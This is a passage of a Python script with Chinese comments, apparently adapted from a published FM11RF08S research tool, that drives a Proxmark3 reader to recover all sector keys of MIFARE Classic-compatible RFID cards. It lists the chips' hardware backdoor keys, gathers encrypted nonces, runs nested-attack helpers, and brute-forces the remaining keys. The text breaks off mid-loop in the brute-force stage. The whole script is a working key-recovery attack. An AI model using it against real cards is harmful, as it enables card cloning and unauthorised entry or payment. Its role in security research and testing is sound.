#!/usr/bin/env python3
# 指定使用Python 3解释器执行此脚本

# 结合多种攻击方法来恢复FM11RF08S芯片的所有密钥
# 
# 使用条件：
# * 存在已知密钥的后门漏洞
#
# 恢复时间强烈依赖于密钥的重用情况和位置
# 示例：
# * 32个随机密钥：约20分钟
# * 每个扇区keyA==keyB的16个随机密钥：约30分钟
# * 跨扇区重复使用的24个随机密钥：<1分钟
#
# Doegox, 2024, 更多信息请参考 https://eprint.iacr.org/2024/1275

import os  # 导入os模块，提供操作系统相关功能
import sys  # 导入sys模块，提供Python解释器相关功能
import time  # 导入time模块，提供时间相关功能
import subprocess  # 导入subprocess模块，用于启动和管理外部进程
import argparse  # 导入argparse模块，用于解析命令行参数
import json  # 导入json模块，用于处理JSON格式数据

# optional color support  # 可选的颜色支持
try:  # 尝试导入
    # pip install ansicolors  # 提示安装ansicolors包
    from colors import color  # 从colors模块导入color函数
except ModuleNotFoundError:  # 如果模块未找到

    def color(s, fg=None):  # 定义color函数，参数s为字符串，fg为前景色
        _ = fg  # 忽略fg参数
        return str(s)  # 返回字符串s


# 首先尝试FM11RF08S密钥
# 然后尝试FM11RF08密钥，因为一些罕见的*98卡也使用它
# 最后尝试FM11RF32N密钥，以防万一...
BACKDOOR_KEYS = ["A396EFA4E24F", "A31667A8CEC1", "518B3354E760"]  # 定义后门密钥列表

NUM_SECTORS = 16  # 定义扇区数量为16
NUM_EXTRA_SECTORS = 1  # 定义额外扇区数量为1（通常是扇区32）
DICT_DEF = "mfc_default_keys.dic"  # 定义默认密钥字典文件名
DEFAULT_KEYS = set()  # 初始化默认密钥集合为空
if __name__ == "__main__":  # 如果脚本作为主程序运行
    DIR_PATH = os.path.dirname(os.path.abspath(sys.argv[0]))  # 获取脚本所在目录的绝对路径
else:  # 否则（作为模块导入）
    DIR_PATH = os.path.dirname(os.path.abspath(__file__))  # 获取当前文件的目录绝对路径

TOOLS_PATH = DIR_PATH  # 设置工具路径为脚本所在目录

PROXMARK3_CLIENT_PATH = f"{DIR_PATH}\\client"  # 构建Proxmark3客户端路径
DICT_DEF_PATH = f"{PROXMARK3_CLIENT_PATH}\\dictionaries\\{DICT_DEF}"  # 构建默认密钥字典的完整路径
env = os.environ.copy()  # 复制当前环境变量
env["QT_PLUGIN_PATH"] = f"{PROXMARK3_CLIENT_PATH}\\libs"  # 设置Qt插件路径
env["HOME"] = PROXMARK3_CLIENT_PATH  # 设置HOME目录为Proxmark3客户端路径
env["QT_QPA_PLATFORM_PLUGIN_PATH"] = f"{PROXMARK3_CLIENT_PATH}\\libs"  # 设置Qt平台插件路径
env["PATH"] = f"{PROXMARK3_CLIENT_PATH}\\libs;{PROXMARK3_CLIENT_PATH}\\libs\\shell;"  # 设置PATH环境变量
env["MSYSTEM"] = "MINGW64"  # 设置MSYSTEM为MINGW64

tools = {  # 定义工具字典，键为工具名，值为可执行文件路径
    "staticnested_1nt": os.path.join(f"{TOOLS_PATH}", "staticnested_1nt"),  # staticnested_1nt工具路径
    "staticnested_2x1nt": os.path.join(f"{TOOLS_PATH}", "staticnested_2x1nt_rf08s"),  # staticnested_2x1nt工具路径
    "staticnested_2x1nt1key": os.path.join(  # staticnested_2x1nt1key工具路径
        f"{TOOLS_PATH}", "staticnested_2x1nt_rf08s_1key"
    ),
}

for tool, bin in tools.items():  # 遍历工具字典中的每个工具
    if not os.path.isfile(bin):  # 如果工具文件不存在
        if os.path.isfile(bin + ".exe"):  # 如果添加.exe扩展名的文件存在
            tools[tool] = bin + ".exe"  # 更新工具路径为添加.exe扩展名
        else:  # 否则（文件不存在）
            print(f"Cannot find {bin}, abort!")  # 打印错误信息
            exit()  # 退出程序


def recovery(  # 定义恢复函数
    init_check=False,  # 参数：是否执行初始默认密钥检查，默认False
    final_check=False,  # 参数：是否执行最终验证检查，默认False
    keep=False,  # 参数：是否保留生成的字典文件，默认False
    debug=False,  # 参数：是否启用调试模式，默认False
    supply_chain=False,  # 参数：是否启用供应链攻击模式，默认False
    quiet=True,  # 参数：是否静默模式，默认True
    keyset=False,  # 参数：是否提供预定义的密钥集合，默认False
    port=None,  # 参数：串口端口号，默认None
):
    # 定义内部函数show，用于显示消息
    def show(s="", prompt="[" + color("=", fg="yellow") + "] ", **kwargs):  
        if not quiet:  # 如果不是静默模式
            s = f"{prompt}" + f"\n{prompt}".join(s.split("\n"))  # 在多行消息的每一行前添加提示符
            print(s, **kwargs)  # 打印消息

    start_time = time.time()  # 记录开始时间

    pm3 = subprocess.Popen(  # 启动Proxmark3进程
        f"{PROXMARK3_CLIENT_PATH}\\proxmark3.exe {port}",  # 执行命令
        shell=True,  # 使用shell执行
        stdout=subprocess.PIPE,  # 捕获标准输出
        stdin=subprocess.PIPE,  # 提供标准输入
        stderr=subprocess.PIPE,  # 捕获标准错误
        env=env,  # 使用设置的环境变量
    )

    uid = None  # 初始化uid为None
    out, _ = pm3.communicate(b"hf 14a read\n")  # 发送读取命令并获取输出 _丢弃的变量

    for line in out.decode("gbk").split("\n"):  # 遍历输出的每一行
        if "UID:" in line:  # 如果行中包含"UID:"
            #print(line)  # 打印该行
            uid = int(line.replace("UID:", "").strip().replace(" ", "")[-8:], 16)  # 提取UID字符串并转换为整数

    if uid is None:  # 如果uid为None
        show("未找到卡片")  # 显示卡片未找到
        return False  # 返回False
    show("UID: " + color(f"{uid:08X}", fg="green"))  # 显示UID（绿色）

    def show_key(sec, key_type, key):  # 定义内部函数show_key，用于显示找到的密钥
        kt = ["A", "B"][key_type]  # 根据key_type确定是A密钥还是B密钥
        show(f"Sector {sec:2} key{kt} = " + color(key, fg="green"))  # 显示扇区和密钥

    save_path = f"{DIR_PATH}\\"  # 设置保存路径

    found_keys = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 初始化密钥存储结构

    if keyset != False:  # 如果提供了预定义的密钥集合
        n = min(len(found_keys), len(keyset))  # 确定要复制的密钥对数量
        show(f"{n} Key pairs supplied: ")  # 显示提供了多少密钥对
        for i in range(0, n):  # 遍历每个密钥对
            found_keys[i] = keyset[i]  # 复制密钥对
            show(  # 显示每个扇区的密钥
                f"  Sector {i:2d} : A = {found_keys[i][0]:12s}   B = {found_keys[i][1]:12s}"
            )

    if init_check:  # 如果启用了初始默认密钥检查
        show("正在检查默认密钥……")  # 显示检查默认密钥的消息
        cmd = "hf mf fchk"  # 构建检查命令
        pm3 = subprocess.Popen(  # 重新启动Proxmark3进程
            f"{PROXMARK3_CLIENT_PATH}\\proxmark3.exe {port}",
            shell=True,
            stdout=subprocess.PIPE,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
        )
        out, _ = pm3.communicate(cmd.encode())  # 执行命令
        for line in out.decode("gbk").split("\n"):  # 遍历输出的每一行
            if "[+]  0" in line:  # 匹配成功验证的行
                res = [x.strip() for x in line.split("|")]  # 分割行内容
                sec = int(res[0][4:])  # 提取扇区号
                if res[3] == "1":  # 如果A密钥验证成功
                    found_keys[sec][0] = res[2]  # 保存A密钥
                    show_key(sec, 0, found_keys[sec][0])  # 显示A密钥
                if res[5] == "1":  # 如果B密钥验证成功
                    found_keys[sec][1] = res[4]  # 保存B密钥
                    show_key(sec, 1, found_keys[sec][1])  # 显示B密钥

    show("获取随机数消息...")  # 显示获取随机数的消息
    nonces_with_data = ""  # 初始化保存随机数数据的文件名
    for key in BACKDOOR_KEYS:  # 按优先级尝试不同的后门密钥
        cmd = f"hf mf isen --collect_fm11rf08s_with_data --key {key}"  # 构建收集随机数的命令

        pm3 = subprocess.Popen(  # 启动Proxmark3进程
            f"{PROXMARK3_CLIENT_PATH}\\proxmark3.exe {port}",
            shell=True,
            stdout=subprocess.PIPE,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
        )
        out, _ = pm3.communicate(cmd.encode())  # 执行命令
        for line in out.decode("gbk").split("\n"):  # 遍历输出的每一行
            if "Wrong" in line or "error" in line:  # 如果密钥错误或有错误
                break  # 跳出循环，尝试下一个密钥
            if "Saved" in line:  # 如果找到保存的文件名
                # 提取"json file "之后的所有内容作为文件名
                prefix = "json file "
                if prefix in line:
                    nonces_with_data = line.split(prefix)[1].strip()
                else:
                    # 如果格式意外，使用原始的反引号提取作为备用
                    if "`" in line:
                        nonces_with_data = line[line.index("`"):].strip("`")
                    else:
                        # 最后的手段：取最后一个单词
                        nonces_with_data = line.split()[-1].strip()
        if nonces_with_data != "":  # 如果成功获取到文件名
            break  # 跳出循环，不再尝试其他密钥

    if nonces_with_data == "":  # 检查是否成功获取随机数
        show("获取 nonce 值时出错,中止.")  # 获取失败
        return False  # 返回False

    try:  # 尝试打开并读取JSON格式的随机数数据文件
        with open(nonces_with_data.replace("`", "").strip(), "r") as file:  # 打开文件
            dict_nwd = json.load(file)  # 加载JSON数据
    except json.decoder.JSONDecodeError:  # 如果JSON解析错误
        show(f"解析错误{nonces_with_data},中止.")  # 显示错误信息
        return False  # 返回False

    nt = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 初始化随机数数组
    nt_enc = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 初始化加密的随机数数组
    par_err = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 初始化奇偶校验错误数组
    data = ["" for _ in range(NUM_SECTORS * 4)]  # 初始化数据块数组
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
        real_sec = sec  # 实际扇区号
        if sec >= NUM_SECTORS:  # 如果是额外扇区（扇区32）
            real_sec += 16  # 调整扇区号（32）
        nt[sec][0] = dict_nwd["nt"][f"{real_sec}"]["a"].lower()  # 提取A密钥的随机数
        nt[sec][1] = dict_nwd["nt"][f"{real_sec}"]["b"].lower()  # 提取B密钥的随机数
        nt_enc[sec][0] = dict_nwd["nt_enc"][f"{real_sec}"]["a"].lower()  # 提取A密钥的加密随机数
        nt_enc[sec][1] = dict_nwd["nt_enc"][f"{real_sec}"]["b"].lower()  # 提取B密钥的加密随机数
        par_err[sec][0] = dict_nwd["par_err"][f"{real_sec}"]["a"]  # 提取A密钥的奇偶校验错误
        par_err[sec][1] = dict_nwd["par_err"][f"{real_sec}"]["b"]  # 提取B密钥的奇偶校验错误
    for blk in range(NUM_SECTORS * 4):  # 遍历所有数据块
        data[blk] = dict_nwd["blocks"][f"{blk}"]  # 提取数据块内容

    show("正在生成第一个转储文件")  # 显示生成转储文件的消息
    dumpfile = f"{save_path}hf-mf-{uid:08X}-dump.bin"  # 转储文件名
    with open(dumpfile, "wb") as f:  # 以二进制写入模式打开文件
        for sec in range(NUM_SECTORS):  # 遍历所有扇区
            for b in range(4):  # 每个扇区有4个块
                d = data[(sec * 4) + b]  # 获取数据块
                if b == 3:  # 如果是扇区尾部块（块3）
                    ka = found_keys[sec][0]  # 获取A密钥
                    kb = found_keys[sec][1]  # 获取B密钥
                    if ka == "":  # 如果A密钥未知
                        ka = "FFFFFFFFFFFF"  # 使用默认未知密钥
                    if kb == "":  # 如果B密钥未知
                        kb = "FFFFFFFFFFFF"  # 使用默认未知密钥
                    d = ka + d[12:20] + kb  # 构造尾部块
                f.write(bytes.fromhex(d))  # 将16进制字符串转换为字节并写入文件
    show(f"数据已转储至`{dumpfile}`")  # 显示转储完成

    elapsed_time1 = time.time() - start_time  # 计算第一步耗时
    minutes = int(elapsed_time1 // 60)  # 计算分钟数
    seconds = int(elapsed_time1 % 60)  # 计算秒数
    show(  # 显示第一步耗时
        "----第一步耗时: "
        + color(f"{minutes:2}", fg="yellow")
        + " 分 "
        + color(f"{seconds:2}", fg="yellow")
        + " 秒 -----------"
    )

    if os.path.isfile(DICT_DEF_PATH):  # 检查默认密钥字典文件是否存在
        show(f"加载中 {DICT_DEF}")  # 显示加载消息
        with open(DICT_DEF_PATH, "r", encoding="utf-8") as file:  # 打开字典文件
            for line in file:  # 遍历每一行
                if line[0] != "#" and len(line) >= 12:  # 忽略注释行，只处理长度至少为12的行
                    DEFAULT_KEYS.add(line[:12])  # 添加密钥到集合
    else:  # 否则（字典文件不存在）
        show(f"警告, {DICT_DEF} 未找到.")  # 显示警告信息

    dict_dnwd = None  # 初始化供应链数据字典
    def_nt = ["" for _ in range(NUM_SECTORS)]  # 初始化默认随机数数组
    if supply_chain:  # 如果启用了供应链攻击模式
        try:  # 尝试加载供应链攻击数据
            default_nonces = f"{save_path}hf-mf-{uid:04X}-default_nonces.json"  # 构建供应链攻击数据文件名
            with open(default_nonces, "r") as file:  # 打开文件
                dict_dnwd = json.load(file)  # 加载供应链数据
                for sec in range(NUM_SECTORS):  # 遍历扇区
                    def_nt[sec] = dict_dnwd["nt"][f"{sec}"].lower()  # 提取默认随机数
                show(f"已加载默认 nonce {default_nonces}.")  # 显示加载成功
        except FileNotFoundError:  # 如果文件不存在
            pass  # 跳过
        except json.decoder.JSONDecodeError:  # 如果JSON解析错误
            show(f"Error parsing {default_nonces}, skipping.")  # 显示错误信息

    show("尽可能运行 staticnested_1nt 和 2x1nt...")  # 显示开始分析的消息
    keys = [[set(), set()] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 初始化密钥候选集合
    all_keys = set()  # 初始化所有找到的密钥集合
    duplicates = set()  # 初始化跨扇区重复的密钥集合
    filtered_dicts = [[False, False] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 记录哪些扇区有过滤后的字典
    found_default = [[False, False] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 记录哪些扇区找到了默认密钥
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
        real_sec = sec  # 实际扇区号
        if sec >= NUM_SECTORS:  # 如果是额外扇区
            real_sec += 16  # 调整扇区号
        if found_keys[sec][0] != "" and found_keys[sec][1] != "":  # 如果该扇区的两个密钥都已找到
            continue  # 跳过
        if (  # 如果两个密钥都未知，且A和B的随机数不同
            found_keys[sec][0] == ""
            and found_keys[sec][1] == ""
            and nt[sec][0] != nt[sec][1]
        ):
            for key_type in [0, 1]:  # 对A和B密钥分别运行staticnested_1nt工具
                cmd = [  # 构建命令
                    tools["staticnested_1nt"],  # 工具名称
                    f"{uid:08X}",  # UID
                    f"{real_sec}",  # 扇区号
                    nt[sec][key_type],  # 随机数
                    nt_enc[sec][key_type],  # 加密的随机数
                    par_err[sec][key_type],  # 奇偶校验错误
                ]
                if debug:  # 如果启用调试模式
                    print(" ".join(cmd))  # 打印命令
                subprocess.run(cmd, capture_output=True)  # 运行命令
            cmd = [  # 构建staticnested_2x1nt命令
                tools["staticnested_2x1nt"],
                f"keys_{uid:08x}_{real_sec:02}_{nt[sec][0]}.dic",  # A密钥字典
                f"keys_{uid:08x}_{real_sec:02}_{nt[sec][1]}.dic",  # B密钥字典
            ]
            if debug:  # 如果启用调试模式
                print(" ".join(cmd))  # 打印命令
            subprocess.run(cmd, capture_output=True)  # 运行命令
            filtered_dicts[sec][key_type] = True  # 标记该扇区有过滤后的字典
            for key_type in [0, 1]:  # 处理每个密钥类型的候选密钥
                keys_set = set()  # 初始化密钥集合
                with open(  # 读取过滤后的字典文件
                    f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic"
                ) as f:
                    while line := f.readline().rstrip():  # 读取每一行
                        keys_set.add(line)  # 添加到集合
                    keys[sec][key_type] = keys_set.copy()  # 复制到主密钥结构
                    duplicates.update(all_keys.intersection(keys_set))  # 查找跨扇区重复的密钥
                    all_keys.update(keys_set)  # 添加到所有密钥集合
                if dict_dnwd is not None and sec < NUM_SECTORS:  # 如果供应链攻击模式且扇区小于16
                    cmd = [  # 构建供应链攻击命令
                        tools["staticnested_2x1nt1key"],
                        def_nt[sec],  # 默认随机数
                        "FFFFFFFFFFFF",  # 虚拟密钥
                        f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic",  # 字典文件
                    ]
                    if debug:  # 如果启用调试模式
                        print(" ".join(cmd))  # 打印命令
                    result = subprocess.run(cmd, capture_output=True, text=True).stdout  # 运行命令
                    keys_def_set = set()  # 初始化默认密钥集合
                    for line in result.split("\n"):  # 遍历输出行
                        if "MATCH:" in line:  # 如果找到匹配
                            keys_def_set.add(line[12:])  # 提取匹配的密钥
                    keys_set.difference_update(keys_def_set)  # 从候选密钥中移除默认密钥
                else:  # 否则（普通模式）
                    keys_def_set = DEFAULT_KEYS.intersection(keys_set)  # 优先考虑默认密钥
                keys_set.difference_update(keys_def_set)  # 从候选密钥中移除默认密钥
                if real_sec == 32:  # 特殊处理：扇区32的B密钥通常以0000开头
                    keyb32cands = set(x for x in keys_set if x.startswith("0000"))  # 查找以0000开头的密钥
                    keys_def_set.update(keyb32cands)  # 将这些密钥加入默认集合
                    keys_set.difference_update(keyb32cands)  # 从候选集合中移除
                if len(keys_def_set) > 0:  # 如果找到了默认密钥
                    found_default[sec][key_type] = True  # 标记找到了默认密钥
                    with open(  # 重新写字典文件以确保默认密钥在前
                        f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic",
                        "w",
                    ) as f:
                        for k in keys_def_set:  # 先写入默认密钥
                            f.write(f"{k}\n")
                        for k in keys_set:  # 再写入其他候选密钥
                            f.write(f"{k}\n")
        else:  # 否则（只有一个密钥未知，或者两个密钥的随机数相同）
            if found_keys[sec][0] == "":  # 如果A密钥未知
                key_type = 0  # A密钥未知
            else:  # 否则
                key_type = 1  # B密钥未知
            cmd = [  # 构建staticnested_1nt命令
                tools["staticnested_1nt"],
                f"{uid:08X}",
                f"{real_sec}",
                nt[sec][key_type],
                nt_enc[sec][key_type],
                par_err[sec][key_type],
            ]
            if debug:  # 如果启用调试模式
                print(" ".join(cmd))  # 打印命令
            subprocess.run(cmd, capture_output=True)  # 运行命令
            keys_set = set()  # 初始化密钥集合
            with open(f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic") as f:  # 打开字典文件
                while line := f.readline().rstrip():  # 读取每一行
                    keys_set.add(line)  # 添加到集合
                keys[sec][key_type] = keys_set.copy()  # 保存到主密钥结构
                duplicates.update(all_keys.intersection(keys_set))  # 查找重复密钥
                all_keys.update(keys_set)  # 添加到所有密钥集合
            if dict_dnwd is not None and sec < NUM_SECTORS:  # 如果供应链攻击模式且扇区小于16
                cmd = [  # 构建供应链攻击命令
                    tools["staticnested_2x1nt1key"],
                    def_nt[sec],  # 默认随机数
                    "FFFFFFFFFFFF",  # 虚拟密钥
                    f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic",  # 字典文件
                ]
                if debug:  # 如果启用调试模式
                    print(" ".join(cmd))  # 打印命令
                result = subprocess.run(cmd, capture_output=True, text=True).stdout  # 运行命令
                keys_def_set = set()  # 初始化默认密钥集合
                for line in result.split("\n"):  # 遍历输出行
                    if "MATCH:" in line:  # 如果找到匹配
                        keys_def_set.add(line[12:])  # 提取匹配的密钥
                keys_set.difference_update(keys_def_set)  # 从候选密钥中移除默认密钥
            else:  # 否则（普通模式）
                keys_def_set = DEFAULT_KEYS.intersection(keys_set)  # 优先考虑默认密钥
            keys_set.difference_update(keys_def_set)  # 从候选密钥中移除默认密钥
            if len(keys_def_set) > 0:  # 如果找到了默认密钥
                found_default[sec][key_type] = True  # 标记找到了默认密钥
                with open(  # 重新写字典文件以确保默认密钥在前
                    f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic", "w"
                ) as f:
                    for k in keys_def_set:  # 先写入默认密钥
                        f.write(f"{k}\n")
                    for k in keys_set:  # 再写入其他候选密钥
                        f.write(f"{k}\n")

    show("查找重复密钥的消息...")  # 显示查找重复密钥的消息
    keys_filtered = [[set(), set()] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 初始化过滤后的密钥集合
    for dup in duplicates:  # 遍历所有重复密钥
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
            for key_type in [0, 1]:  # 遍历A和B密钥
                if dup in keys[sec][key_type]:  # 如果该扇区包含这个重复密钥
                    keys_filtered[sec][key_type].add(dup)  # 添加到过滤后的集合

    duplicates_dicts = [[False, False] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 记录重复密钥字典
    first = True  # 标记是否是第一次创建字典文件
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
        real_sec = sec  # 实际扇区号
        if sec >= NUM_SECTORS:  # 如果是额外扇区
            real_sec += 16  # 调整扇区号
        for key_type in [0, 1]:  # 遍历A和B密钥
            if len(keys_filtered[sec][key_type]) > 0:  # 如果有过滤后的密钥
                if first:  # 如果是第一次
                    show("保存重复字典...")  # 显示保存消息
                    first = False  # 更新标记
                with open(  # 创建重复密钥字典文件
                    f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_duplicates.dic",
                    "w",
                ) as f:
                    keys_set = keys_filtered[sec][key_type].copy()  # 复制密钥集合
                    keys_def_set = DEFAULT_KEYS.intersection(keys_set)  # 优先考虑默认密钥
                    keys_set.difference_update(DEFAULT_KEYS)  # 移除默认密钥
                    for k in keys_def_set:  # 先写入默认密钥
                        f.write(f"{k}\n")
                    for k in keys_set:  # 再写入其他候选密钥
                        f.write(f"{k}\n")
                duplicates_dicts[sec][key_type] = True  # 标记已创建字典

    show("计算攻击所需的时间...")  # 显示计算时间的消息
    candidates = [[0, 0] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]  # 初始化候选密钥数量计数器
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
        real_sec = sec  # 实际扇区号
        if sec >= NUM_SECTORS:  # 如果是额外扇区
            real_sec += 16  # 调整扇区号
        for key_type in [0, 1]:  # 遍历A和B密钥
            if (  # 如果两个密钥都未知，且有重复密钥字典
                found_keys[sec][0] == ""
                and found_keys[sec][1] == ""
                and duplicates_dicts[sec][key_type]
            ):
                kt = ["a", "b"][key_type]  # 密钥类型
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_duplicates.dic"  # 字典文件
                with open(dic, "r") as file:  # 打开字典文件
                    count = sum(1 for _ in file)  # 计算字典文件行数
                candidates[sec][key_type] = count  # 记录候选数量
                if nt[sec][0] == nt[sec][1]:  # 如果A和B随机数相同
                    candidates[sec][key_type ^ 1] = 1  # 另一个密钥的候选数量为1
        for key_type in [0, 1]:  # 遍历A和B密钥
            if (  # 如果两个密钥都未知，有过滤后的字典，且没有重复密钥字典
                found_keys[sec][0] == ""
                and found_keys[sec][1] == ""
                and filtered_dicts[sec][key_type]
                and candidates[sec][0] == 0
                and candidates[sec][1] == 0
            ):
                if found_default[sec][key_type]:  # 如果找到了默认密钥
                    candidates[sec][key_type] = 1  # 假设默认密钥正确，候选数量为1
                else:  # 否则
                    kt = ["a", "b"][key_type]  # 密钥类型
                    dic = (  # 字典文件
                        f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic"
                    )
                    with open(dic, "r") as file:  # 打开字典文件
                        count = sum(1 for _ in file)  # 计算字典文件行数
                    candidates[sec][key_type] = count  # 记录候选数量
        if (  # 如果两个密钥都未知，随机数相同，且没有其他字典
            found_keys[sec][0] == ""
            and found_keys[sec][1] == ""
            and nt[sec][0] == nt[sec][1]
            and candidates[sec][0] == 0
            and candidates[sec][1] == 0
        ):
            if found_default[sec][0]:  # 如果找到了默认密钥
                candidates[sec][0] = 1  # A密钥候选数量为1
                candidates[sec][1] = 1  # B密钥候选数量为1
            else:  # 否则
                key_type = 0  # 密钥类型为A
                kt = ["a", "b"][key_type]  # 密钥类型字符串
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic"  # 字典文件
                with open(dic, "r") as file:  # 打开字典文件
                    count = sum(1 for _ in file)  # 计算字典文件行数
                candidates[sec][0] = count  # A密钥候选数量
                candidates[sec][1] = 1  # B密钥候选数量为1（随机数相同）

    if debug:  # 如果启用调试模式
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
            real_sec = sec  # 实际扇区号
            if sec >= NUM_SECTORS:  # 如果是额外扇区
                real_sec += 16  # 调整扇区号
            show(  # 显示候选密钥数量
                f" {real_sec:03} | {real_sec*4+3:03} | {candidates[sec][0]:6} | {candidates[sec][1]:6}  "
            )
    total_candidates = sum(  # 计算所有候选密钥的总数
        candidates[sec][0] + candidates[sec][1]
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS)
    )

    elapsed_time2 = time.time() - start_time - elapsed_time1  # 计算第二步耗时
    minutes = int(elapsed_time2 // 60)  # 计算分钟数
    seconds = int(elapsed_time2 % 60)  # 计算秒数
    show(  # 显示第二步耗时
        "----第二步耗时: "
        + color(f"{minutes:2}", fg="yellow")
        + " 分 "
        + color(f"{seconds:2}", fg="yellow")
        + " 秒 -----------"
    )

    FCHK_KEYS_S = 147  # 假设fchk命令每秒可检查147个密钥
    foreseen_time = (total_candidates / 2 / FCHK_KEYS_S) + 5  # 估算剩余时间
    minutes = int(foreseen_time // 60)  # 计算分钟数
    seconds = int(foreseen_time % 60)  # 计算秒数
    show(  # 显示剩余时间
        "预计花费: "
        + color(f"{minutes:2}", fg="yellow")
        + " 分 "
        + color(f"{seconds:2}", fg="yellow")
        + " 秒"
    )

    abort = False  # 中断标志
    show("暴力破解密钥... 按任意键中断")  # 显示暴力破解消息
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
        real_sec = sec  # 实际扇区号
        if sec >= NUM_SECTORS:  # 如果是额外扇区
            real_sec += 16  # 调整扇区号
        for key_type in [0, 1]:  # 遍历A和B密钥
            if (  # 如果两个密钥都未知，且有重复密钥字典
                found_keys[sec][0] == ""
                and found_keys[sec][1] == ""
                and duplicates_dicts[sec][key_type]
            ):
                kt = ["a", "b"][key_type]  # 密钥类型
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_duplicates.dic"  # 字典文件
                cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} -f {dic} --no-default"  # 构建暴力破解命令
                if debug:  # 如果启用调试模式
                    print(cmd)  # 打印命令
                pm3 = subprocess.Popen(  # 启动Proxmark3进程
                    f"{PROXMARK3_CLIENT_PATH}\\proxmark3.exe {port}",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                )
                out, _ = pm3.communicate(cmd.encode())  # 执行暴力破解
                for line in out.decode("gbk").split("\n"):  # 遍历输出行
                    if "aborted via keyboard" in line:  # 检测到键盘中断
                        abort = True  # 设置中断标志
                    if "found:" in line:  # 找到了密钥
                        found_keys[sec][key_type] = line[30:].strip()  # 提取密钥
                        show_key(real_sec, key_type, found_keys[sec][key_type])  # 显示密钥
                        if (  # 如果随机数相同，另一个密钥也相同
                            nt[sec][0] == nt[sec][1]
                            and found_keys[sec][key_type ^ 1] == ""
                        ):
                            found_keys[sec][key_type ^ 1] = found_keys[sec][key_type]  # 设置另一个密钥
                            show_key(  # 显示另一个密钥
                                real_sec, key_type ^ 1, found_keys[sec][key_type ^ 1]
                            )
                    if "found valid key" in line:  # 找到了密钥
                        found_keys[sec][key_type] = line[54:67].strip()  # 提取密钥
                        show_key(real_sec, key_type, found_keys[sec][key_type])  # 显示密钥
                        if (  # 如果随机数相同，另一个密钥也相同
                            nt[sec][0] == nt[sec][1]
                            and found_keys[sec][key_type ^ 1] == ""
                        ):
                            found_keys[sec][key_type ^ 1] = found_keys[sec][key_type]  # 设置另一个密钥
                            show_key(  # 显示另一个密钥
                                real_sec, key_type ^ 1, found_keys[sec][key_type ^ 1]
                            )
            if abort:  # 如果中断
                break  # 跳出循环
        if abort:  # 如果中断
            break  # 跳出循环

        for key_type in [0, 1]:  # 遍历A和B密钥
            if (  # 如果两个密钥都未知，且有过滤后的字典
                found_keys[sec][0] == ""
                and found_keys[sec][1] == ""
                and filtered_dicts[sec][key_type]
            ):
                kt = ["a", "b"][key_type]  # 密钥类型
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic"  # 字典文件
                cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} -f {dic} --no-default"  # 构建暴力破解命令
                if debug:  # 如果启用调试模式
                    print(cmd)  # 打印命令
                pm3 = subprocess.Popen(  # 启动Proxmark3进程
                    f"{PROXMARK3_CLIENT_PATH}\\proxmark3.exe {port}",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                )
                out, _ = pm3.communicate(cmd.encode())  # 执行暴力破解
                for line in out.decode("gbk").split("\n"):  # 遍历输出行
                    if "aborted via keyboard" in line:  # 检测到键盘中断
                        abort = True  # 设置中断标志
                    if "found:" in line:  # 找到了密钥
                        found_keys[sec][key_type] = line[30:].strip()  # 提取密钥
                        show_key(real_sec, key_type, found_keys[sec][key_type])  # 显示密钥
                    if "found valid key" in line:  # 找到了密钥
                        found_keys[sec][key_type] = line[54:67].strip()  # 提取密钥
                        show_key(real_sec, key_type, found_keys[sec][key_type])  # 显示密钥
            if abort:  # 如果中断
                break  # 跳出循环
        if abort:  # 如果中断
            break  # 跳出循环

        if (  # 如果两个密钥都未知，且随机数相同
            found_keys[sec][0] == ""
            and found_keys[sec][1] == ""
            and nt[sec][0] == nt[sec][1]
        ):
            key_type = 0  # 密钥类型为A
            kt = ["a", "b"][key_type]  # 密钥类型字符串
            dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic"  # 字典文件
            cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} -f {dic} --no-default"  # 构建暴力破解命令
